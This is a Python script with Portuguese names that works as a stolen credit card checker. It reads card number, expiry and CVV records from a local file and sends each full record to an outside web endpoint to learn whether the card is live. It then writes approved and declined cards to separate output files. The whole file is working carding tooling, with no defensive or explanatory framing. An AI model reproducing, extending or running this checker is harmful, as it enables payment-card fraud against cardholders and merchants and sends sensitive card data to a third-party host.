import os
import time
import random
import requests
from colorama import init, Fore

init(autoreset=True)

def validar_data_expiracao(mes, ano):
    mes_atual = 11
    ano_atual = 2024
    if len(ano) == 2:
        ano = "20" + ano
    ano = int(ano)
    mes = int(mes)
    return ano > ano_atual or (ano == ano_atual and mes >= mes_atual)

def gerar_tempo_espera(min_t, max_t, dif_min):
    tempo_alto = random.randint(min_t + dif_min, max_t)
    tempo_baixo = random.randint(min_t, tempo_alto - dif_min)
    return random.randint(tempo_baixo, tempo_alto)

def processar_cartao(cc, mes, ano, cvv, caminho_db, linhas_db):
    if not validar_data_expiracao(mes, ano):
        print(f"[DATE EXPIRED] {cc}|{mes}|{ano}|{cvv}")
        remover_cartao_db(caminho_db, linhas_db, f"{cc}|{mes}|{ano}|{cvv}\n")
        return

    # Tempo de espera removido aqui

    start_time = time.time()
    try:
        r = requests.get(
            f"https://hug4l.alwaysdata.net/script/api.php?lista={cc}|{mes}|{ano}|{cvv}",
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Referer': 'http://hug4l.alwaysdata.net',
                'Accept': '*/*'
            }
        )
        exec_result = r.text
    except Exception:
        exec_result = ""

    timer = round(time.time() - start_time, 1)

    if "Approved" in exec_result:
        status_tag = "Card added"
        status = "#Approved"
        with open("approved.txt", "a") as f:
            f.write(f"{cc}|{mes}|{ano}|{cvv} - {status_tag}\n")
        cor = Fore.GREEN
    elif "Declined" in exec_result:
        status_tag = "Your card was declined."
        status = "#Declined"
        with open("dead.txt", "a") as f:
            f.write(f"{cc}|{mes}|{ano}|{cvv} - {status_tag}\n")
        cor = Fore.RED
    elif "#Erro" in exec_result:
        status_tag = "error"
        status = "#Error"
        with open("error.txt", "a") as f:
            f.write(f"{cc}|{mes}|{ano}|{cvv} - {status_tag}\n")
        cor = Fore.YELLOW
    else:
        status_tag = "no response"
        status = "#Unknown"
        with open("unknown.txt", "a") as f:
            f.write(f"{cc}|{mes}|{ano}|{cvv} - {status_tag}\n")
        cor = Fore.RESET

    linha_colorida = f"[{status}] {cc}|{mes}|{ano}|{cvv} -> {status_tag} ({timer}s)"
    print(f"{cor}{linha_colorida}")

    remover_cartao_db(caminho_db, linhas_db, f"{cc}|{mes}|{ano}|{cvv}\n")

def remover_cartao_db(caminho_db, linhas_db, linha_a_remover):
    if linha_a_remover in linhas_db:
        linhas_db.remove(linha_a_remover)
        with open(caminho_db, "w") as f:
            f.writelines(linhas_db)

def main():
    caminho = os.path.join(os.path.dirname(__file__), "db.txt")
    if not os.path.exists(caminho):
        print("❌ Arquivo 'db.txt' não encontrado na pasta do script.")
        return

    with open(caminho, "r") as file:
        linhas = file.readlines()

    for linha in linhas[:]:
        dados = linha.strip().split("|")
        if len(dados) != 4:
            print(f"❌ Formato inválido: {linha.strip()}")
            continue
        cc, mes, ano, cvv = dados
        processar_cartao(cc, mes, ano, cvv, caminho, linhas)

if __name__ == "__main__":
    main()
